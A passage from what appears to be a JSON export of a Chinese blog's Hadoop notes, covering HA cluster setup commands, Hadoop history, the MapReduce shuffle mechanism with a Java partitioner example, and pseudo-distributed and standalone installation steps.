1536--&gt; &lt;property&gt; &lt;name&gt;yarn.app.mapreduce.am.resource.mb&lt;/name&gt; &lt;value&gt;1536&lt;/value&gt; &lt;/property&gt; &lt;!-- MapReduce 存储中间数据文件的本地目录。目录不存在则被忽略。默 认值${hadoop.tmp.dir}/mapred/local--&gt; &lt;property&gt; &lt;name&gt;mapreduce.cluster.local.dir&lt;/name&gt; &lt;value&gt;/export/servers/hadoop-2.7.5/data/system/local&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; 修改 slaves第一台机器执行以下命令 cd /export/servers/hadoop-2.7.5/etc/hadoopvim slaves slavesnode01node02node03 修改 hadoop-env.sh第一台机器执行以下命令 cd /export/servers/hadoop-2.7.5/etc/hadoopvim hadoop-env.sh hadoop-env.shexport JAVA_HOME=/export/servers/jdk1.8.0_141 集群启动过程将第一台机器的安装包发送到其他机器上第一台机器执行以下命令 cd /export/serversscp -r hadoop-2.7.5/ node02:$PWDscp -r hadoop-2.7.5/ node03:$PWD 三台机器上共同创建目录三台机器执行以下命令 mkdir -p /export/servers/hadoop-2.7.5/data/dfs/nn/namemkdir -p /export/servers/hadoop-2.7.5/data/dfs/nn/editsmkdir -p /export/servers/hadoop-2.7.5/data/dfs/nn/namemkdir -p /export/servers/hadoop-2.7.5/data/dfs/nn/edits 更改 node02 的 rm2第二台机器执行以下命令 cd /export/servers/hadoop-2.7.5/etc/hadoopvim yarn-site.xml yarn-site.xml&lt;!--在 node3 上配置 rm1,在 node2 上配置 rm2,注意：一般都喜欢把配置好的文件远程复制到其它机器上，但这个在 YARN 的另一个机器上一定要修改，其他机器上不配置此项注意我们现在有两个 resourceManager 第三台是 rm1 第二台是 rm2这个配置一定要记得去 node02 上面改好--&gt;&lt;property&gt; &lt;name&gt;yarn.resourcemanager.ha.id&lt;/name&gt; &lt;value&gt;rm2&lt;/value&gt; &lt;description&gt;If we want to launch more than one RM in single node, we need this configuration&lt;/description&gt;&lt;/property&gt; 启动 HDFS 过程node01 机器执行以下命令 cd /export/servers/hadoop-2.7.5bin/hdfs zkfc -formatZKsbin/hadoop-daemons.sh start journalnodebin/hdfs namenode -formatbin/hdfs namenode -initializeSharedEdits -forcesbin/start-dfs.sh jps node02 上面执行 cd /export/servers/hadoop-2.7.5bin/hdfs namenode -bootstrapStandbysbin/hadoop-daemon.sh start namenode 启动 yarn 过程node03 上面执行 cd /export/servers/hadoop-2.7.5sbin/start-yarn.sh node02 上执行 cd /export/servers/hadoop-2.7.5sbin/start-yarn.sh 查看 resourceManager 状态node03 上面执行 cd /export/servers/hadoop-2.7.5bin/yarn rmadmin -getServiceState rm1 node02 上面执行 cd /export/servers/hadoop-2.7.5bin/yarn rmadmin -getServiceState rm2 启动 jobHistorynode03 机器执行以下命令启动 jobHistory cd /export/servers/hadoop-2.7.5sbin/mr-jobhistory-daemon.sh start historyserver hdfs 状态查看node01 机器查看 hdfs 状态http://192.168.52.100:50070/dfshealth.html#tab-overview node02 机器查看 hdfs 状态http://192.168.52.110:50070/dfshealth.html#tab-overview yarn 集群访问查看http://192.168.52.120:8088/cluster 历史任务浏览界面页面访问：http://192.168.52.120:19888/jobhistory"},{"title":"","date":"2022-05-10T02:47:00.000Z","updated":"2022-05-10T02:47:00.000Z","comments":true,"path":"notes/Hadoop/index.html","permalink":"https://blog.mhuig.top/notes/Hadoop/","excerpt":"","text":".fa-secondary{opacity:.4} Hadoop Hadoop .prev-next{ display: none !important; }"},{"title":"","date":"2019-09-19T03:24:00.000Z","updated":"2022-05-10T02:57:00.000Z","comments":true,"path":"notes/Hadoop/history.html","permalink":"https://blog.mhuig.top/notes/Hadoop/history","excerpt":"","text":"发展历史 大数据处理技术 - hadoop 的介绍以及发展历史 Hadoop 是什么?Hadoop: The Definitive Guide 谁说大象不能跳舞？！ —— 挑战互联网规模的数据存储与分析！ Hadoop：适合大数据的分布式存储和计算平台. Hadoop 不是指具体一个框架或者组件，它是 Apache 软件基金会下用 Java 语言开发的一个开源分布式计算平台。实现在大量计算机组成的集群中对海量数据进行分布式计算。适合大数据的分布式存储和计算平台。 Hadoop1.x 中包括两个核心组件：MapReduce 和 Hadoop Distributed File System (HDFS). 其中 HDFS 负责将海量数据进行分布式存储，而 MapReduce 负责提供对数据的计算结果的汇总. Hadoop 的起源Hadoop 最早起源于 Nutch。 Nutch 的设计目标是构建一个大型的全网搜索引擎，包括网页抓取、索引、查询等功能，但随着抓取网页数量的增加，遇到了严重的可扩展性问题 —— 如何解决数十亿网页的存储和索引问题。 2003 年、2004 年谷歌发表的两篇论文为该问题提供了可行的解决方案。 分布式文件系统 GFS，可用于处理海量网页的存储 分布式计算框架 MAPREDUCE，可用于处理海量网页的索引计算问题。 Nutch 的开发人员完成了相应的开源实现 HDFS 和 MAPREDUCE，并从 Nutch 中剥离成为独立项目 HADOOP，到 2008 年 1 月，HADOOP 成为 Apache 顶级项目 (同年，cloudera 公司成立)，迎来了它的快速发展期。狭义上来说，hadoop 就是单独指代 hadoop 这个软件，广义上来说，hadoop 指代大数据的一个生态圈，包括很多其他的软件. 2003-2004 年，Google 公布了部分 GFS 和 MapReduce 思想的细节，受此启发的 Doug Cutting 等人用 2 年的业余时间实现了 DFS 和 MapReduce 机制，使 Nutch 性能飙升，然后 Yahoo 招安 Doug Gutting 及其项目。 2005 年，Hadoop 作为 Lucene 的子项目 Nutch 的一部分正式引入 Apache 基金会。 2006 年 2 月被分离出来，成为一套完整独立的软件，起名为 Hadoop Hadoop 名字不是一个编写，而是一个生造出来的词。是 Hadoop 之父 Doug Cutting 儿子毛线玩具象命名的。 Hadoop 的成长过程 Lucene -&gt; Nutch -&gt; Hadoop 总结起来，Hadoop 起源于 Google 的三大论文 GFS：Google 的分布式文件系统 Google File System MapReduce：Google 的 MapReduce 开源分布式并行计算框架 BigTable：一个大型的分布式数据库 演变关系 GFS -&gt; HDFSGoogle MapReduce —&gt; Hadoop MapReduceBig Table —&gt; HBase Hadoop 发展史2004 年 —— 最初的版本（现在称为 HDFS 和 MapReduce) 由 Doug Cutting 和 Mike Cafarella 开始实施。2005 年 12 月 —— Nutch 移植到新的框架，Hadoop 在 20 个节点上稳定运行。2006 年 1 月 —— Doug Cutting 加入雅虎。2006 年 2 月 —— Apache Hadoop 项目正式启动以支持 MapReduce 和 HDFS 的独立发展。2006 年 2 月 —— 雅虎的网格计算团队采用 Hadoop。2006 年 4 月 —— 标准排序（10GB 每个节点）在 188 个节点上运行 47.9 个小时。2006 年 5 月 —— 雅虎建立了一个 300 个节点的 Hadoop 研究集群。2006 年 5 月 —— 标准排序在 500 个节点上运行 42 个小时（硬件配置比 4 月的更好）。2006 年 11 月 —— 研究集群增加到 600 个节点。2006 年 12 月 —— 标准排序在 20 个节点上运行 1.8 个小时，100 个节点 3.3 小时，500 个节点 5.2 小时，900 个节点 7.8 个小时。2007 年 1 月 —— 研究集群到达 900 个节点。2007 年 4 月 —— 研究集群达到两个 1000 个节点的集群。2008 年 4 月 —— 赢得世界最快 1TB 数据排序在 900 个节点上用时 209 秒。2008 年 7 月 —— 雅虎测试节点增加到 4000 个2008 年 9 月 —— Hive 成为 Hadoop 的子项目2008 年 11 月 —— Google 宣布其 MapReduce 用 68 秒对 1TB 的程序进行排序2008 年 10 月 —— 研究集群每天装载 10TB 的数据。2008 年 —— 淘宝开始投入研究基于 Hadoop 的系统 - 云梯。云梯总容量约 9.3PB，共有 1100 台机器，每天处理 18000 道作业，扫描 500TB 数据。2009 年 3 月 —— 17 个集群总共 24000 台机器。2009 年 3 月 —— Cloudera 推出 CDH (Cloudera's Dsitribution Including Apache Hadoop)2009 年 4 月 —— 赢得每分钟排序，雅虎 59 秒内排序 500GB（在 1400 个节点上）和 173 分钟内排序 100TB 数据（在 3400 个节点上）。2009 年 5 月 —— Yahoo 的团队使用 Hadoop 对 1 TB 的数据进行排序只花了 62 秒时间。2009 年 7 月 —— Hadoop Core 项目更名为 Hadoop Common;2009 年 7 月 —— MapReduce 和 Hadoop Distributed File System (HDFS) 成为 Hadoop 项目的独立子项目。2009 年 7 月 —— Avro 和 Chukwa 成为 Hadoop 新的子项目。2009 年 9 月 —— 亚联 BI 团队开始跟踪研究 Hadoop2009 年 12 月 —— 亚联提出橘云战略，开始研究 Hadoop2010 年 5 月 —— Avro 脱离 Hadoop 项目，成为 Apache 顶级项目。2010 年 5 月 —— HBase 脱离 Hadoop 项目，成为 Apache 顶级项目。2010 年 5 月 —— IBM 提供了基于 Hadoop 的大数据分析软件 ——InfoSphere Biglnsights，包括基础版和企业版。2010 年 9 月 —— Hive (Facebook) 脱离 Hadoop，成为 Apache 顶级项目。2010 年 9 月 —— Pig 脱离 Hadoop，成为 ApacheJ 顶级项目。2011 年 1 月 —— zooKeeper 脱离 Hadoop，成为 Apache 顶级项目。2011 年 3 月 —— Apache Hadoop 获得 Media Guardian Innovation Awards。2011 年 3 月 —— Platform Computing 宣布在它的 Symphony 软件中支持 Hadoop MapReduce APl。2011 年 5 月 —— Mapr Technologies 公司推出分布式文件系统和 MapReduce 引擎 ——MapR Distribution for Apache Hadoop。2011 年 5 月 —— HCatalog 1.0 发布。该项目由 Hortonworks 在 2010 年 3 月份提出，HCatalog 主要用于解决数据存储、元数据的问题，主要解决 HDFS 的瓶颈，它提供了一个地方来存储数据的状态信息，这使得数据清理和归档工具可以很容易的进行处理。2011 年 4 月 —— SGI (Silicon Graphics International) 基于 SGI Rackable 和 CloudRack 服务器产品线提供 Hadoop 优化的解决方案。 Hadoop 的历史版本介绍0.x 系列版本：hadoop 当中最早的一个开源版本，在此基础上演变而来的 1.x 以及 2.x 的版本 1.x 版本系列：hadoop 版本当中的第二代开源版本，主要修复 0.x 版本的一些 bug 等 2.x 版本系列：架构产生重大变化，引入了 yarn 平台等许多新特性 三大公司发行版本免费开源版本 Apachehttp://hadoop.apache.org/ 优点：拥有全世界的开源贡献者，代码更新迭代版本比较快 缺点：版本的升级，版本的维护，版本的兼容性，版本的补丁都可能考虑不太周到，学习可以用，实际生产工作环境尽量不要使用 apache 所有软件的下载地址（包括各种历史版本）： http://archive.apache.org/dist/ 免费开源版本 HortonWorkshttps://hortonworks.com/ hortonworks 主要是雅虎主导 Hadoop 开发的副总裁，带领二十几个核心成员成立 Hortonworks，核心产品软件 HDP（ambari），HDF 免费开源，并且提供一整套的 web 管理界面，供我们可以通过 web 界面管理我们的集群状态，web 管理界面软件 HDF 网址（http://ambari.apache.org/） 软件收费版本 ClouderaManagerhttps://www.cloudera.com/ cloudera 主要是美国一家大数据公司在 apache 开源 hadoop 的版本上，通过自己公司内部的各种补丁，实现版本之间的稳定运行，大数据生态圈的各个版本的软件都提供了对应的版本，解决了版本的升级困难，版本兼容性等各种问题，生产环境强烈推荐使用"},{"title":"","date":"2019-09-19T08:38:00.000Z","updated":"2022-05-11T12:46:00.000Z","comments":true,"path":"notes/Hadoop/mapreduce-mechanism.html","permalink":"https://blog.mhuig.top/notes/Hadoop/mapreduce-mechanism","excerpt":"","text":"MapReduce 运行机制 大数据处理技术 -Hadoop-MapReduce 的运行机制 Partitioner在 MapReduce 中，通过我们指定分区，会将同一个分区的数据发送到同一个 reduce 当中进行处理，例如我们为了数据的统计，我们可以把一批类似的数据发送到同一个 reduce 当中去，在同一个 reduce 当中统计相同类型的数据，就可以实现类似数据的分区，统计等说白了就是相同类型的数据，送到一起去处理，在 reduce 当中默认分区只有 1 个。MapReduce 当中的分区类图 需求：将以下数据进行分开处理详细数据参见 partition.csv 这个文本文件，其中第五个字段表示开奖结果数值，现在需求将 15 以上的结果以及 15 以下的结果进行分开成两个文件进行保存 注意：分区的案例，只能打成 jar 包发布到集群上面去运行，本地模式已经不能正常运行了 第一步：定义 mapper我们这里的 mapper 程序不做任何逻辑，也不对 key，与 value 做任何改变，只是接收我们的数据，然后往下发送 public class MyMapper extends Mapper&lt;LongWritable,Text,Text,NullWritable&gt;{ @Override protected void map(LongWritable key, Text value, Context context) throws IOException, InterruptedException { context.write(value,NullWritable.get()); }} 第二步：定义 reducer 逻辑我们的 reducer 也不做任何处理，将我们的数据原封不动的输出即可 public class MyReducer extends Reducer&lt;Text,NullWritable,Text,NullWritable&gt; { @Override protected void reduce(Text key, Iterable&lt;NullWritable&gt; values, Context context) throws IOException, InterruptedException { context.write(key,NullWritable.get()); }} 第三步：自定义 partitioner/*** 这里的输入类型与我们 map 阶段的输出类型相同*/public class MyPartitioner extends Partitioner&lt;Text,NullWritable&gt;{ /** * 返回值表示我们的数据要去到哪个分区 * 返回值只是一个分区的标记，标记所有相同的数据去到指定的分区 */ @Override public int getPartition(Text text, NullWritable nullWritable, int i) { String result = text.toString().split(\"\\t\")[5]; System.out.println(result); if (Integer.parseInt(result) &gt; 15){ return 1; }else{ return 0; } }} 第四步：程序 main 函数入口public class PartitionMain extends Configured implements Tool { public static void main(String[] args) throws Exception{ int run = ToolRunner.run(new Configuration(), new PartitionMain(), args); System.exit(run); } @Override public int run(String[] args) throws Exception { Job job = Job.getInstance(super.getConf(),PartitionMain.class.getSimpleName()); job.setJarByClass(PartitionMain.class); job.setInputFormatClass(TextInputFormat.class); job.setOutputFormatClass(TextOutputFormat.class); TextInputFormat.addInputPath(job,new Path(\"hdfs://192.168.52.100:8020/partitioner\")); TextOutputFormat.setOutputPath(job,new Path(\"hdfs://192.168.52.100:8020/outpartition\")); job.setMapperClass(MyMapper.class); job.setMapOutputKeyClass(Text.class); job.setMapOutputValueClass(NullWritable.class); job.setOutputKeyClass(Text.class); job.setMapOutputValueClass(NullWritable.class); job.setReducerClass(MyReducer.class); /** * 设置我们的分区类，以及我们的 reducetask 的个数，注意 reduceTask 的个数一定要与我们的 * 分区数保持一致 */ job.setPartitionerClass(MyPartitioner.class); job.setNumReduceTasks(2); boolean b = job.waitForCompletion(true); return b?0:1; }} MapTask 整个 Map 阶段流程大体如上图所示。简单概述：inputFile 通过 split 被逻辑切分为多个 split 文件，通过 Record 按行读取内容给 map（用户自己实现的）进行处理，数据被 map 处理结束之后交给 OutputCollector收集器，对其结果 key 进行分区（默认使用 hash 分区），然后写入 buffer，每个 map task 都有一个内存缓冲区，存储着 map 的输出结果，当缓冲区快满的时候需要将缓冲区的数据以一个临时文件的方式存放到磁盘，当整个 map task 结束后再对磁盘中这个 map task 产生的所有临时文件做合并，生成最终的正式输出文件，然后等待 reduce task 来拉数据。 详细步骤： 1、 首先，读取数据组件 InputFormat （默认 TextInputFormat ）会通过 getSplits 方法对输入目录中文件进行逻辑切片规划得到 splits，有多少个 split 就对应启动多少个 MapTask 。split 与 block 的对应关系默认是一对一。 2、 将输入文件切分为 splits 之后，由 RecordReader 对象（默认 LineRecordReader ）进行读取，以 \\n 作为分隔符，读取一行数据，返回&lt;key，value&gt;。Key 表示每行首字符偏移值，value 表示这一行文本内容。 3、 读取 split 返回&lt;key,value&gt;，进入用户自己继承的 Mapper 类中，执行用户重写的 map 函数。RecordReader读取一行这里调用一次。 4、 map 逻辑完之后，将 map 的每条结果通过 context.write 进行 collect 数据收集。在 collect 中，会先对其进行分区处理，默认使用HashPartitioner。MapReduce 提供 Partitioner 接口，它的作用就是根据 key 或 value 及 reduce 的数量来决定当前的这对输出数据最终应该交由哪个 reduce task 处理。默认对 keyhash 后再以 reduce task 数量取模。默认的取模方式只是为了平均 reduce 的处理能力，如果用户自己对 Partitioner 有需求，可以订制并设置到 job 上。 5、接下来，会将数据写入内存，内存中这片区域叫做环形缓冲区，缓冲区的作用是批量收集 map 结果，减少磁盘 IO 的影响。我们的 key / value 对以及 Partition 的结果都会被写入缓冲区。当然写入之前，key 与 value 值都会被序列化成字节数组。 环形缓冲区其实是一个数组，数组中存放着 key、value 的序列化数据和 key、value 的元数据信息，包括 partition、key 的起始位置、value 的起始位置以及 value 的长度。环形结构是一个抽象概念。 缓冲区是有大小限制，默认是 100MB。当 map task 的输出结果很多时，就可能会撑爆内存，所以需要在一定条件下将缓冲区中的数据临时写入磁盘，然后重新利用这块缓冲区。这个从内存往磁盘写数据的过程被称为 Spill，中文可译为溢写。这个溢写是由单独线程来完成，不影响往缓冲区写 map 结果的线程。溢写线程启动时不应该阻止 map 的结果输出，所以整个缓冲区有个溢写的比例 spill.percent。这个比例默认是0.8，也就是当缓冲区的数据已经达到阈值（buffer size * spill percent = 100MB * 0.8 = 80MB），溢写线程启动，锁定这 80MB 的内存，执行溢写过程。Map task的输出结果还可以往剩下的 20MB 内存中写，互不影响。 6、当溢写线程启动后，需要对这 80MB 空间内的key做 排序 Sort。排序是 MapReduce 模型默认的行为，这里的排序也是对序列化的字节做的排序。 如果 job 设置过Combiner，那么现在就是使用 Combiner 的时候了。将有相同 key 的key/value对的 value 加起来，减少溢写到磁盘的数据量。Combiner会优化 MapReduce 的中间结果，所以它在整个模型中会多次使用。 那哪些场景才能使用 Combiner 呢？从这里分析，Combiner 的输出是 Reducer 的输入，Combiner 绝不能改变最终的计算结果。Combiner 只应该用于那种Reduce的输入key/value与输出key/value类型完全一致，且不影响最终结果的场景。比如累加，最大值等。Combiner 的使用一定得慎重，如果用好，它对 job 执行效率有帮助，反之会影响 reduce 的最终结果。 7、合并溢写文件： 每次溢写会在磁盘上生成一个临时文件（写之前判断是否有combiner），如果 map 的输出结果真的很大，有多次这样的溢写发生，磁盘上相应的就会有多个临时文件存在。当整个数据处理结束之后开始对磁盘中的临时文件进行 merge 合并，因为最终的文件只有一个，写入磁盘，并且为这个文件提供了一个索引文件，以记录每个 reduce 对应数据的偏移量。至此 map 整个阶段结束。 mapTask 的一些基础设置配置（mapred-site.xml 当中）：http://archive.cloudera.com/cdh5/cdh/5/hadoop-2.6.0-cdh5.14.0/hadoopmapreduce-client/hadoop-mapreduce-client-core/mapred-default.xml 设置一：设置环型缓冲区的内存值大小（默认设置如下） mapreduce.task.io.sort.mb 100 设置二：设置溢写百分比（默认设置如下） mapreduce.map.sort.spill.percent 0.80 设置三：设置溢写数据目录（默认设置） mapreduce.cluster.local.dir ${hadoop.tmp.dir}/mapred/local 设置四：设置一次最多合并多少个溢写文件（默认设置如下） mapreduce.task.io.sort.factor 10 ReduceTask Reduce 大致分为 copy、sort、reduce 三个阶段，重点在前两个阶段。copy 阶段包含一个 eventFetcher 来获取已完成的 map 列表，由 Fetcher 线程去 copy 数据，在此过程中会启动两个 merge 线 程 ， 分 别 为 inMemoryMerger 和 onDiskMerger，分别将内存中的数据 merge 到磁盘和将磁盘中的数据进行 merge。待数据 copy 完成之后，copy 阶段就完成了，开始进行 sort 阶段，sort 阶段主要是执行 finalMerge 操作，纯粹的 sort 阶段。完成之后就是 reduce 阶段，调用用户定义的 reduce 函数进行处理。 详细步骤： 1、Copy 阶段，简单地拉取数据。Reduce 进程启动一些数据 copy 线程 (Fetcher)，通过 HTTP 方式请求 maptask 获取属于自己的文件。2、Merge 阶段。这里的 merge 如 map 端的 merge 动作，只是数组中存放的是不同 map 端 copy 来的数值。Copy 过来的数据会先放入内存缓冲区中，这里的缓冲区大小要比 map 端的更为灵活。merge 有三种形式：内存到内存；内存到磁盘；磁盘到磁盘。默认情况下第一种形式不启用。当内存中的数据量到达一定阈值，就启动内存到磁盘的 merge。与 map 端类似，这也是溢写的过程，这个过程中如果你设置有 Combiner，也是会启用的，然后在磁盘中生成了众多的溢写文件。第二种 merge 方式一直在运行，直到没有 map 端的数据时才结束，然后启动第三种磁盘到磁盘的 merge 方式生成最终的文件。3、合并排序。把分散的数据合并成一个大的数据后，还会再对合并后的数据排序。4、对排序后的键值对调用 reduce 方法，键相等的键值对调用一次 reduce 方法，每次调用会产生零个或者多个键值对，最后把这些输出的键值对写入到 HDFS 文件中。 Shufflemap 阶段处理的数据如何传递给 reduce 阶段，是 MapReduce 框架中最关键的一个流程，这个流程就叫 shuffle。shuffle: 洗牌、发牌 ——（核心机制：数据分区，排序，分组，规约，合并等过程）。 shuffle 是 Mapreduce 的核心，它分布在 Mapreduce 的 map 阶段和 reduce 阶段。一般把从 Map 产生输出开始到 Reduce 取得数据作为输入之前的过程称作 shuffle。 Collect 阶段：将 MapTask 的结果输出到默认大小为 100M 的环形缓冲区，保存的是 key/value，Partition 分区信息等。 Spill 阶段：当内存中的数据量达到一定的阀值的时候，就会将数据写入本地磁盘，在将数据写入磁盘之前需要对数据进行一次排序的操作，如果配置了combiner，还会将有相同分区号和 key 的数据进行排序。 Merge 阶段：把所有溢出的临时文件进行一次合并操作，以确保一个 MapTask 最终只产生一个中间数据文件。 Copy 阶段：ReduceTask 启动 Fetcher 线程到已经完成 MapTask 的节点上复制一份属于自己的数据，这些数据默认会保存在内存的缓冲区中，当内存的缓冲区达到一定的阀值的时候，就会将数据写到磁盘之上。 Merge 阶段：在 ReduceTask 远程复制数据的同时，会在后台开启两个线程对内存到本地的数据文件进行合并操作。 Sort 阶段：在对数据进行合并的同时，会进行排序操作，由于 MapTask 阶段已经对数据进行了局部的排序，ReduceTask 只需保证 Copy 的数据的最终整体有效性即可。 Shuffle 中的缓冲区大小会影响到 mapreduce 程序的执行效率，原则上说，缓冲区越大，磁盘 io 的次数越少，执行速度就越快缓冲区的大小可以通过参数调整, 参数：mapreduce.task.io.sort.mb 默认 100M"},{"title":"","date":"2019-09-19T08:38:00.000Z","updated":"2022-05-11T12:46:00.000Z","comments":true,"path":"notes/Hadoop/mapreduce.html","permalink":"https://blog.mhuig.top/notes/Hadoop/mapreduce","excerpt":"","text":"MapReduce 大数据处理技术 -Hadoop-MapReduce 理解 MapReduce 思想MapReduce 思想在生活中处处可见。或多或少都曾接触过这种思想。MapReduce 的思想核心是 “分而治之”，适用于大量复杂的任务处理场景（大规模数据处理场景）。即使是发布过论文实现分布式计算的谷歌也只是实现了这种思想，而不是自己原创。 Map 负责 “分”，即把复杂的任务分解为若干个 “简单的任务” 来并行处理。可以进行拆分的前提是这些小任务可以并行计算，彼此间几乎没有依赖关系。Reduce 负责 “合”，即对 map 阶段的结果进行全局汇总。 这两个阶段合起来正是 MapReduce 思想的体现。 还有一个比较形象的语言解释 MapReduce：我们要数图书馆中的所有书。你数 1 号书架，我数 2 号书架。这就是 Map。我们人越多，数书就更快。现在我们到一起，把所有人的统计数加在一起。这就是Reduce。 Hadoop MapReduce 设计构思MapReduce 是一个分布式运算程序的编程框架，核心功能是将用户编写的业务逻辑代码和自带默认组件整合成一个完整的分布式运算程序，并发运行在 Hadoop 集群上。既然是做计算的框架，那么表现形式就是有个输入 input，MapReduce 操作这个输入 input，通过本身定义好的计算模型，得到一个输出 output。对许多开发者来说，自己完完全全实现一个并行计算程序难度太大，而 MapReduce 就是一种简化并行计算的编程模型，降低了开发并行应用的入门门槛。 Hadoop MapReduce 构思体现在如下的三个方面： 如何对付大数据处理：分而治之对相互间不具有计算依赖关系的大数据，实现并行最自然的办法就是采取分而治之的策略。并行计算的第一个重要问题是如何划分计算任务或者计算数据以便对划分的子任务或数据块同时进行计算。不可分拆的计算任务或相互间有依赖关系的数据无法进行并行计算！ 构建抽象模型：Map 和 ReduceMapReduce 借鉴了函数式语言中的思想，用 Map 和 Reduce 两个函数提供了高层的并行编程抽象模型。Map: 对一组数据元素进行某种重复式的处理；Reduce: 对 Map 的中间结果进行某种进一步的结果整理。MapReduce 中定义了如下的 Map 和 Reduce 两个抽象的编程接口，由用户去编程实现: map: (k1; v1) → [(k2; v2)]reduce: (k2; [v2]) → [(k3; v3)] Map 和 Reduce 为程序员提供了一个清晰的操作接口抽象描述。通过以上两个编程接口，大家可以看出 MapReduce 处理的数据类型是&lt;key,value&gt;键值对。 统一构架，隐藏系统层细节如何提供统一的计算框架，如果没有统一封装底层细节，那么程序员则需要考虑诸如数据存储、划分、分发、结果收集、错误恢复等诸多细节；为此，MapReduce 设计并提供了统一的计算框架，为程序员隐藏了绝大多数系统层面的处理细节。MapReduce 最大的亮点在于通过抽象模型和计算框架把需要做什么 whatneed to do 与具体怎么做 how to do 分开了，为程序员提供一个抽象和高层的编程接口和框架。程序员仅需要关心其应用层的具体计算问题，仅需编写少量的处理应用本身计算问题的程序代码。如何具体完成这个并行计算任务所相关的诸多系统层细节被隐藏起来, 交给计算框架去处理：从分布代码的执行，到大到数千小到单个节点集群的自动调度使用。 MapReduce 框架结构一个完整的 mapreduce 程序在分布式运行时有三类实例进程： 1、MRAppMaster：负责整个程序的过程调度及状态协调 2、MapTask：负责 map 阶段的整个数据处理流程 3、ReduceTask：负责 reduce 阶段的整个数据处理流程 MapReduce 编程规范MapReduce 编程模型的总结：MapReduce 的开发一共有八个步骤其中 map 阶段分为 2 个步骤，shuffle 阶段 4 个步骤，reduce 阶段分为 2 个步骤 Map 阶段 2 个步骤第一步：设置 inputFormat 类，将我们的数据切分成 key，value 对，输入到第二步第二步：自定义 map 逻辑，处理我们第一步的输入数据，然后转换成新的 key，value 对进行输出 shuffle 阶段 4 个步骤（可以全部不用管）第三步：对输出的 key，value 对进行分区第四步：对不同分区的数据按照相同的 key 进行排序第五步：对分组后的数据进行规约 (combine 操作)，降低数据的网络拷贝（可选步骤）第六步：对排序后的额数据进行分组，分组的过程中，将相同 key 的 value 放到一个集合当中 reduce 阶段 2 个步骤第七步：对多个 map 的任务进行合并，排序，写 reduce 函数自己的逻辑，对输入的 key，value 对进行处理，转换成新的 key，value 对进行输出第八步：设置 outputformat 将输出的 key，value 对数据进行保存到文件中"},{"title":"","date":"2019-09-19T08:29:00.000Z","updated":"2022-05-11T01:13:00.000Z","comments":true,"path":"notes/Hadoop/pseudo-distributed.html","permalink":"https://blog.mhuig.top/notes/Hadoop/pseudo-distributed","excerpt":"","text":"伪分布式 大数据处理技术 - apache hadoop 三种架构介绍 (伪分布介绍以及安装) 伪分布式环境搭建（适用于学习测试开发集群模式） 服务规划 服务器 IP 192.168.52.100 192.168.52.110 192.168.52.120 主机名 node01.hadoop.com node02.hadoop.com node03.hadoop.com NameNode 是 否 否 Secondary NameNode 是 否 否 dataNode 是 是 是 ResourceManager 是 否 否 NodeManager 是 是 是 停止单节点集群停止单节点集群，删除/export/servers/hadoop-2.7.5/hadoopDatas 文件夹，然后重新创建文件夹第一台机器执行以下命令 cd /export/servers/hadoop-2.7.5sbin/stop-dfs.shsbin/stop-yarn.shsbin/mr-jobhistory-daemon.sh stop historyserver 配置集群删除 hadoopDatas 然后重新创建文件夹 rm -rf /export/servers/hadoop-2.7.5/hadoopDatas 重新创建文件夹 mkdir -p /export/servers/hadoop-2.7.5/hadoopDatas/tempDatasmkdir -p /export/servers/hadoop-2.7.5/hadoopDatas/namenodeDatasmkdir -p /export/servers/hadoop-2.7.5/hadoopDatas/namenodeDatas2mkdir -p /export/servers/hadoop-2.7.5/hadoopDatas/datanodeDatasmkdir -p /export/servers/hadoop-2.7.5/hadoopDatas/datanodeDatas2mkdir -p /export/servers/hadoop-2.7.5/hadoopDatas/nn/editsmkdir -p /export/servers/hadoop-2.7.5/hadoopDatas/snn/namemkdir -p /export/servers/hadoop-2.7.5/hadoopDatas/dfs/snn/edits 修改 slaves 文件，然后将安装包发送到其他机器，重新启动集群即可第一台机器执行以下命令 cd /export/servers/hadoop-2.7.5/etc/hadoopvim slaves slavesnode01node02node03 安装包的分发第一台机器执行以下命令 cd /export/servers/scp -r hadoop-2.7.5 node02:$PWDscp -r hadoop-2.7.5 node03:$PWD 启动集群第一台机器执行以下命令 cd /export/servers/hadoop-2.7.5bin/hdfs namenode -formatsbin/start-dfs.shsbin/start-yarn.shsbin/mr-jobhistory-daemon.sh start historyserver 第一台 jps 后： 第二台：jps 后: 第三台 jps 后："},{"title":"","date":"2019-09-19T08:26:00.000Z","updated":"2022-05-10T10:07:00.000Z","comments":true,"path":"notes/Hadoop/stand-alone.html","permalink":"https://blog.mhuig.top/notes/Hadoop/stand-alone","excerpt":"","text":"StandAlone 大数据处理技术 - apache hadoop 三种架构介绍（StandAlone) hadoop 文档: http://hadoop.apache.org/docs/ StandAlone 环境搭建 运行服务 服务器 IP NameNode 192.168.52.100 SecondaryNameNode 192.168.52.100 DataNode 192.168.52.100 ResourceManager 192.168.52.100 NodeManager 192.168.52.100 第一步：下载 apache hadoop 并上传到服务器下载链接： http://archive.apache.org/dist/hadoop/common/hadoop-2.7.5/hadoop2.7.5.tar.gz 解压命令 cd /export/softwarestar -zxvf hadoop-2.7.5.tar.gz -C ../servers/ hadoop 安装包结构hadoop-2.7.5/bin: 一些 shell 脚本，供我们使用hadoop-2.7.5/sbin: 一些 shell 脚本，供我们使用hadoop-2.7.5/etc/hadoop: 所有的配置文件的路径hadoop-2.7.5/lib/native: 本地的 C 程序库 hadoop 六个核心配置文件的作用core-site.xml：核心配置文件，主要定义了我们文件访问的格式 hdfs://hadoop-env.sh：主要配置我们的 java 路径hdfs-site.xml：主要定义配置我们的 hdfs 的相关配置mapred-site.xml 主要定义我们的 mapreduce 相关的一些配置slaves：控制我们的从节点在哪里 datanode nodemanager 在哪些机器上yarn-site.xml：配置我们的 resourcemanager 资源调度 第二步：修改配置文件打开 notepad++ 修改 core-site.xml第一台机器执行以下命令 cd /export/servers/hadoop-2.7.5/etc/hadoopvim core-site.xml http://archive.cloudera.com/cdh5/cdh/5/hadoop-2.6.0-cdh5.14.0/ 定义文件系统的实现 file:/// 本地文件系统 hdfs://分布式文件系统 core-site.xml&lt;configuration&gt; &lt;property&gt; &lt;name&gt;fs.default.name&lt;/name&gt; &lt;value&gt;hdfs://192.168.52.100:8020&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hadoop.tmp.dir&lt;/name&gt; &lt;value&gt;/export/servers/hadoop2.7.5/hadoopDatas/tempDatas&lt;/value&gt; &lt;/property&gt; &lt;!-- 缓冲区大小，实际工作中根据服务器性能动态调整 --&gt; &lt;property&gt; &lt;name&gt;io.file.buffer.size&lt;/name&gt; 